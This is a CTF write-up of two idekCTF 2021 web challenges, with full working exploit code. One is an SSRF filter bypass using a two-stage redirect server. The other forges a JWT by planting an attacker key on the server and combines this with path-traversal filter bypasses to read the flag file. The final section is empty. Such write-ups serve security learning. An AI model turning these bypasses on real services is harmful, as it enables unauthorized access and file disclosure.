# idekCTF 2021 write-ups

![Banner](https://i.imgur.com/38WiIUr.jpg)

The first edition of idekCTF brought some really nice and creative web challenges.

We solved almost all of the web challenges. We didn't have much time to work on generic pastebin, but the first look on it was also great.

We also solved some pwn, rev, misc, forensics and crypto challenges and **got 8th place!!**

![Leaderboard](https://i.imgur.com/MraLxeH.png)

I worked on 3 challenges that I'll write about here.

## Difference Check

![Difference Check](https://i.imgur.com/Z3A19cK.png)

### Challenge

In this challenge, we have an app that gets two links and shows the differences of content in a colored diff format.

![Difference Check - Output](https://i.imgur.com/FT5Kq9U.png)

We also have the source code:

```javascript=
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const ssrfFilter = require('ssrf-req-filter');
const fetch = require('node-fetch');
const Diff = require('diff');
const hbs = require('express-handlebars');
const port = 1337;
const flag = 'idek{REDACTED}';


app.use(bodyParser.urlencoded({ extended: true }));
app.engine('hbs', hbs.engine({
    defaultLayout: 'main',
    extname: '.hbs'
}));

app.set('view engine', 'hbs');


async function validifyURL(url){
	valid = await fetch(url, {agent: ssrfFilter(url)})
	.then((response) => {
		return true
	})
	.catch(error => {
		return false
	});
	return valid;
};

async function diffURLs(urls){
	try{
		const pageOne = await fetch(urls[0]).then((r => {return r.text()}));
		const pageTwo = await fetch(urls[1]).then((r => {return r.text()}));
		return Diff.diffLines(pageOne, pageTwo)
	} catch {
		return 'error!'
	}
};

app.get('/', (req, res) => {
	res.render('index');
});

app.get('/flag', (req, res) => {
	if(req.connection.remoteAddress == '::1'){
		res.send(flag)}
	else{
		res.send("Forbidden", 503)}
});

app.post('/diff', async (req, res) => {
	let { url1, url2 } = req.body
	if(typeof url1 !== 'string' || typeof url2 !== 'string'){
		return res.send({error: 'Invalid format received'})
	};
	let urls = [url1, url2];
	for(url of urls){
		const valid = await validifyURL(url);
		if(!valid){
			return res.send({error: `Request to ${url} was denied`});
		};
	};
	const difference = await diffURLs(urls);
	res.render('diff', {
		lines: difference
	});

});

app.listen(port, () => {
	console.log(`App listening at http://localhost:${port}`)
});
```

* **Summary**
    * There is a **/flag** route, but it only accepts local connections. Our hearts say we have to look for [SSRFs](https://portswigger.net/web-security/ssrf) here.
    * The **/diff** route calls a validation function. If the validation is accepted, render using the diff package.
    * The validation function uses the package [ssrf-req-filter](https://github.com/y-mehta/ssrf-req-filter) to prevent shenanigans (we know you).

### Hack

This is a very direct challenge. We have to bypass the SSRF filter, using the /diff route to get the content of /flag.

Of course, we are blocked:

![Request Denied](https://i.imgur.com/O8hqC6g.png)

The validifyURL function calls the ssrfFilter functions, which identifies the hack.

To bypass the filter, I tried and failed some alternatives:
* Using some SSRF cheat sheets
* Created a server that redirected the request to 127.0.0.1

The source code for ssrf-req-filter is quite small:
https://github.com/y-mehta/ssrf-req-filter/blob/master/lib/index.js

The redirect didn't work, because the filter not only analyze the URL string, but it makes the request, following redirects, and checks the IP of the final URL (Damn you!)

Now we know we'll receive two requests: the filter and the actual request from diff function.

To bypass the filter, we can make a server to respond the first request (filter) with a bullshit value and the next (actual request) with a redirect to http://127.0.0.1:1337/flag.

```javascript=
const express = require('express');
const app = express();
const port = 1338;

myredirect = false;

app.get('/one', (req, res) => {
    if (myredirect) {
        myredirect = false;
        res.redirect("http://127.0.0.1:1337/flag");
    } else {
        myredirect = true;
        res.send("One!");
    }
});

// Just to fill the second diff textbox
app.get('/two', (req, res) => {
    res.send("Two!");
});

app.listen(port, () => {
	console.log(`App listening at http://localhost:${port}`)
});
```

Let's start it:
```
$ node exploiter.js 
App listening at http://localhost:1338
```

And expose it on ngrok, with address: http://4070-201-17-126-102.ngrok.io

Let's play the game:
![Fill the hack values](https://i.imgur.com/jZtHb1b.png)

Post it!
![diff-owned](https://i.imgur.com/oKRwq9L.png)

Flag:
```
idek{d1ff3r3nc3_ch3ck3r_d3ce1v3d_bY_d1ff3r3nc3s}
```

## Steghide as a Service

### Challenge

![Steghide as a Service](https://i.imgur.com/MsyHftv.png)

In this challenge, we send a content (secret meassage), password and a JPEG image.

It returns the image with the secret message hidden in the image, protected by the password.

If we just test it with a random content, password **secret1** and a known image (jpeg-home.jpg). It returns an image called **jpeg-home.jpg_guest_7353** - the original image name and a suffix.

Let's check the hidden message:

```
$ steghide --extract -sf jpeg-home.jpg_guest_7353 -p secret1
wrote extracted data to "yUe0FKraWQN1e2KVrkc9E3GgltU0rvRJ.txt".

$ cat yUe0FKraWQN1e2KVrkc9E3GgltU0rvRJ.txt
Message
```

The message is encoded as a text file, with a random name.

### Source Analysis

Source is kind of big (for writeup purposes), but it's worthwhile.

The Dockerfile shows there is an RSA key pair being generated (we'll check on it later).

```bash
openssl genrsa -out private.pem 3072 && openssl rsa -in private.pem -pubout -out public.pem
```

Let's take a look at the **app.py**:

```python=
from flask import Flask, request, render_template, make_response, redirect, send_file
import imghdr
from imghdr import tests
import hashlib
from util import *

# https://stackoverflow.com/questions/36870661/imghdr-python-cant-detec-type-of-some-images-image-extension
# there are no bugs here. just patching imghdr
JPEG_MARK = b'\xff\xd8\xff\xdb\x00C\x00\x08\x06\x06' \
            b'\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f'

def test_jpeg1(h, f):
    """JPEG data in JFIF format"""
    if b'JFIF' in h[:23]:
        return 'jpeg'

def test_jpeg2(h, f):
    """JPEG with small header"""
    if len(h) >= 32 and 67 == h[5] and h[:32] == JPEG_MARK:
        return 'jpeg'


def test_jpeg3(h, f):
    """JPEG data in JFIF or Exif format"""
    if h[6:10] in (b'JFIF', b'Exif') or h[:2] == b'\xff\xd8':
        return 'jpeg'

tests.append(test_jpeg1)
tests.append(test_jpeg2)
tests.append(test_jpeg3)


def verify_jpeg(file_path):
    try:
        jpeg = Image.open(file_path)
        jpeg.verify()
        if imghdr.what(file_path) != 'jpeg':
            return False
        return True
    except:
        return False


app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024

@app.route('/')
def index():
    resp = make_response(render_template('upload.html'))
    if not request.cookies.get('session'):
        resp.set_cookie('session', create_token())
    return resp

@app.route('/upload', methods=['POST'])
def upload():
    if not request.cookies.get('session'):
        return redirect('/')
    session = request.cookies.get('session')
    uploaded_file = request.files['file']
    password = request.form['password']
    content = request.form['content']
    upload_name = uploaded_file.filename.replace('../', '') # no traversal!
    output_name = os.path.join('output/', os.path.basename(upload_name))
    image_data = uploaded_file.stream.read()
    image_md5 = hashlib.md5(image_data).hexdigest()
    image_path = f'uploads/{image_md5}.jpeg'
    content_path = f"uploads/{rand_string()}.txt"

    # write temp txt file
    with open(content_path, 'w') as f:
        f.write(content)
        f.close()

    # write temp image file
    with open(image_path, 'wb') as f:
        f.write(image_data)
        f.close()
    
    # verify jpeg validity
    if not verify_jpeg(image_path):
        return 'File is not a valid JPEG!', 400

    # verify session before using it
    session = verify_token(session)
    if not session:
        return 'Session token invalid!', 400
    
    # attempt to embed message in image
    try:
        embed_file(content_path, image_path, output_name, password)
    except:
        return 'Embedding failed!', 400
    
    # append username to output path to prevent vulns
    sanitized_path = f'output/{upload_name}_{session["username"]}'
    try:
        if not os.path.exists(sanitized_path):
            os.rename(output_name, sanitized_path)
    except:
        pass
    try:
        return send_file(sanitized_path)
    except:
        return 'Something went wrong! Check your file name', 400

app.run('0.0.0.0', 1337)
```
* **Summary**
    * The / route shows the index and creates a token using a custom function (more on that later)
    * The /upload route gets the information and the image file, making a (weak) validation.
    * Saves the file to **uploads/{image_md5}.jpeg**
    * Saves the content (secret message) to **uploads/{random_string}.txt**
    * Validates JPEG correct format with a custom function
    * Validates the session token (generated by the / route)
    * Embeds the message in the file (using steghide)
    * Creates the output file with name **output/{upload_name}_{session["username"]}**

We also have a functions file, **util.py**, to dig deeper in some custom behaviour.

```python=
from PIL import Image
import random
import jwt
import string
import os
from imghdr import tests
import subprocess

priv_key = open('keys/private.pem', 'r').read()


def create_token():
    priv_key = open('keys/private.pem', 'r').read()
    token = jwt.encode({"username": f"guest_{random.randint(1,10000)}"}, priv_key, algorithm='RS256', headers={'pubkey': 'public.pem'})
    return token

def verify_token(token):
    try:
        headers = jwt.get_unverified_header(token)
        pub_key_path = headers['pubkey']
        pub_key_path = pub_key_path.replace('..', '') # no traversal!
        pub_key_path = os.path.join(os.getcwd(), os.path.join('keys/', pub_key_path))
        pub_key = open(pub_key_path, 'rb').read()
        if b'BEGIN PUBLIC KEY' not in pub_key:
            return False
        return jwt.decode(token, pub_key, algorithms=['RS256', 'HS256'])
    except:
        return False

def rand_string():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(32))

def embed_file(embed_file, cover_file, stegfile, password):
    cmd = subprocess.Popen(['steghide', 'embed', '-ef', embed_file, '-cf', cover_file, '-sf', stegfile, '-p', password]).wait(timeout=.5)

def cleanup():
    for f in os.listdir('uploads/'):
        os.remove(os.path.join('uploads/', f))
    for f in os.listdir('output/'):
        os.remove(os.path.join('output/', f))
```
* **Summary**
    * The **create_token** function creates a JWT token with username being guest_<random_number>.
        * This is the suffix of the generated jpeg file name.
        * It uses the private key to sign the the token, the same key generated at the start.
        * It has a header showing the location of the public key!
    * There is a verification function, to check if the token is not phony:
        * It looks for the pubkey location in the JWT header (usually public.pem).
        * Protects from path traversal (not that much).
        * Tries to decode the JWT with the public key.
        * Returns OK if the decode was successful.

The source doesn't have a reference to the flag. It is just a text file inside the app directory.

### Hacktion Plan

There are some weak spots we can compose to hack the app:
* We can send a fake JWT token, pointing the public key header to another location.
* We can put a public key of a pair generated locally in the server machine.
    * We just send it as the content (secret message).
* After downloading the changed JPEG and extracting the secret info with steghide, we have the random file name generated for our content (our controlled public key) in the server.

Now we can fake a valid JWT session in the server.

But we still need some way to get the flag!

The key is here:

```python=94
    # append username to output path to prevent vulns
    sanitized_path = f'output/{upload_name}_{session["username"]}'
    try:
        if not os.path.exists(sanitized_path):
            os.rename(output_name, sanitized_path)
    except:
        pass
    try:
        return send_file(sanitized_path)
    except:
        return 'Something went wrong! Check your file name', 400
```

The **sanitized_path** string is composed of elements we partially control. If we manage to change it to a controlled value, we can download the flag through LFI. To achieve it, we need some control over **upload_name** and **session["username"]**.

The **upload_name** is generated here:

```python
    uploaded_file = request.files['file']
    # ...
    upload_name = uploaded_file.filename.replace('../', '') # no traversal!
```

This traversal filter is easily bypassed by "....//" (and variations). We can control the **file** value in the uploaded form.

The **session["username"]** comes from the token, but we can also control, since we can forge the JWT token.

Let's simulate a happy path scenario to understand this:

```python
uploaded_file = "image.jpg"
upload_name = uploaded_file.replace('../', '') 
session_username = "guest_7353"
sanitized_path = f'output/{upload_name}_{session_username}'

print(sanitized_path)

#Output: output/image.jpg_guest_7353
```

Now let's exercise what values we need to change to make the sanitized path go to the flag.

```python
uploaded_file = "" # Lets first focus on the session_username
upload_name = uploaded_file.replace('../', '') 
session_username = "/../../flag.txt"
sanitized_path = f'output/{upload_name}_{session_username}'

print(sanitized_path)

#Output: output/_/../../flag.txt
```

OK, we're close but that wont work because the "_" is not a real directory. Since we can't get rid of the underscore, we need to find a directory with this character in the name, to compose the path traversal.

```bash
$ find . -iname "*_*"
./__pycache__
```

OK, let's try using the "\_\_pycache\_\_" directory in our play.

```python
uploaded_file = "....//"
upload_name = uploaded_file.replace('../', '') 
session_username = "_pycache__/../flag.txt"
sanitized_path = f'output/{upload_name}_{session_username}'

print(sanitized_path)
#Output: output/../__pycache__/../flag.txt

f = open(sanitized_path, 'r')
print(f.read())

#Output: idek{REDACTED}
```

Now we have a move!

Before moving to the exploit, there's a note here: for some reason, the server didn't have the \_\_pycache\_\_ directory. The exploit was working locally, in the docker server, but not in the real CTF server.
The solution was to use a different \_\_pycache\_\_ inside the container: **/usr/local/lib/python3.8/http/\_\_pycache\_\_**.

### Exploiting

1. **Keys**

To start the game, let's generate our local keys to the fake JWT (just copied the Dockerfile command).

```bash
$ mkdir keys
$ cd keys/

$ openssl genrsa -out private.pem 3072 && openssl rsa -in private.pem -pubout -out public.pem

Generating RSA private key, 3072 bit long modulus (2 primes)
....................................................++++
................++++
e is 65537 (0x010001)
writing RSA key

$ ls
private.pem  public.pem
```

2. **Upload Public Key**

We'll start using Python here to automate things. Let's code to upload our own key to the server (inside the secret message).

```python=13
def rand_string():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))

def get_file_for_upload(filename):
    return {
        'file': (filename, open('jpeg-home.jpg.jpg', 'rb')),
    }

def gen_public_key_on_server():
    session = requests.Session()
    session.get(f'{target_url}/')

    files = get_file_for_upload(f'jpeg-home-{rand_string()}.jpg')

    data = {
        'content': open('keys/public.pem').read(),
        'password': 'secret-1'
    }

    response = session.post(f'{target_url}/upload', files=files, data=data)
    with open(outfilename, 'wb') as outfile:
        outfile.write(response.content)
        
# ... lot of lines

gen_public_key_on_server()
```

Let's call it:

```bash
$ python exploit.py
$ file remote.jpg 
remote.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 800x400, components 3
```

Nice, session generated and file with embeded content download.

3. **Remote Public Key - File Name**

Let's find the name of the Public Key in the server:

```bash
$ steghide --extract -sf remote.jpg -p secret-1
wrote extracted data to "cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt".

$ cat cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt
-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAuQqLhAM8b50D5SXjZ+x8
uoF32bCV2zMyUs3Bc0YJ94igYG8w2mGuFOIUsJRWMhiv/r4RNNqdVP+8aGWfI04O
ps4e9jUQtGifjHcCSuxnFJkDnm2IZjbvvW4vMgb8vwms5jzNquXdMnnMkrUdCAXN
GEjlJg4vJVSv8bMi8/soZTfj9cGL6NZeIjGgukt+aNlAiW6xj1dXuWr6MTzrqOKV
V5/+/3SSxk57u5Q/boXem0MkKJLZlzH4YhrWNOx6gHXtsh3jbBD9ls7C8Udy37hw
opU/gqQqIaOSi1RDsBjhsL40jmGcWQrGMl5YnDl8uw1Z4IsOmHThFsSXOn8Mi+iY
Kkps2ITVdbY2Fh2GwoG8E7rxM1eIL0U4nznCMOxRFSHgD3V+NkT74ZXuq3R2Tseq
ZrX5h9CWcGNWNleOC4TVOhRXa04hX+UujGOaSOcd32mAfCXMe8WopAc0gNOSfzNZ
pv3AmgySKktlk5WsmlrOEp2LL3Ce660OTeeuHR56dUk7AgMBAAE=
-----END PUBLIC KEY-----

$ md5sum cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt
d4bbed6c4f6074fdddd41a1d0aa68e18  cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt

$ md5sum keys/public.pem 
d4bbed6c4f6074fdddd41a1d0aa68e18  keys/public.pem
```

Check! We uploaded our public key file correctly and it's name on the server is **uploads/cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt**.

4. **Create fake token and get the flag**

We can't separate this steps :)

```python=10
target_pub_file = 'cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl'

# ... Lot of lines

def create_token(username, pubkey):
    priv_key = open('keys/private.pem', 'r').read()
    token = jwt.encode({"username": username}, priv_key, algorithm='RS256', headers={'pubkey': pubkey})
    return token.decode('ascii')

def get_flag(token):
    cookies = {
        'session': token,
    }

    # files = get_file_for_upload('....//__pycache') # Server do not have it :@
    files = get_file_for_upload('....//....//....//....//usr/local/lib/python3.8/http/__pycache')

    data = {
        'content': 'me',
        'password': 'secret-1'
    }

    response = requests.post(f'{target_url}/upload', cookies=cookies, files=files, data=data)
    return response.text

def attack():
    flag_path_traversal = f'_/../../../../../../../app/flag.txt'
    pubkey_path_traversal = f'../{app_path}/uploads/{target_pub_file}.txt'

    poisoned_token = create_token(flag_path_traversal, pubkey_path_traversal)

    print(poisoned_token)

    print(get_flag(poisoned_token))

# gen_public_key_on_server()
attack()
```

Run, Forrest, Run!

```bash
$ python exploit.py 
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsInB1YmtleSI6Ii4uLy9hcHAvdXBsb2Fkcy9jRTZSRjNLc1lPYXRkdTFuZHI5ZUdrT1FQSnZFNzdQbC50eHQifQ.eyJ1c2VybmFtZSI6Il8vLi4vLi4vLi4vLi4vLi4vLi4vLi4vYXBwL2ZsYWcudHh0In0.XQUkeMd7ZSBbaMFVDQNscQv3287OISZNxOlsAeaDT1i1FPXI8BJhNVrrSbcvxgU13n5FuMw1M7jEmZRNXZogeuhqMpPLveOuFxv56vb85eGNdNK6Vj3BNQyX9njRFZmLpIGPR8yMu2H3P0Cr6qCva5LYBx0uQxWiXesGOFVNTFkRKb-ViSLggWMSCgU0lB_QvRKRP0TPaSjiKpZpmbG2Zf140OmIA_pwc1whBKf9G4Pne_9dHyGX9FpNBXJduUOWjumdvJUyz_nkdyozmQHmE8k3oYPZuPbKsfJC009jhU7bpqdXUeWjn2mRTMYAv3FayK7BOr7-19tjl-NlConKOxPXVSbsGERfwTldHMIJqnETVvJ8ZCOeNfVC2TfWXfF-xlUg7DkPQ0qcmCsMlswPMGmiVWrD2xyK1DVE9vmSig8JO6bCqHbc3D-h9HTij1SNJqNjWK4CxnkVkjq2CN-64wMImaqvt5SQEfyteNcdiKbZOKcVRa0MVKCeyO_3n-Xj

idek{0bl1g4t0ry_jWt_Ch4LL3nGe}
```

Flag for us!

```
idek{0bl1g4t0ry_jWt_Ch4LL3nGe}
```

## Fancy Notes

### Challenge
### Hack

## References
* CTF Time Event: https://ctftime.org/event/1512
* idekCTF: https://ctf.idek.team/
* idekCTF Discord: https://discord.gg/Rrhdvzn
* Repo with the artifacts discussed here: https://github.com/Neptunians/idekctf-2021-writeups
* SSRF: https://portswigger.net/web-security/ssrf
* ssrf-req-filter: https://github.com/y-mehta/ssrf-req-filter
* Team: [FireShell](https://fireshellsecurity.team/)
* Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks) 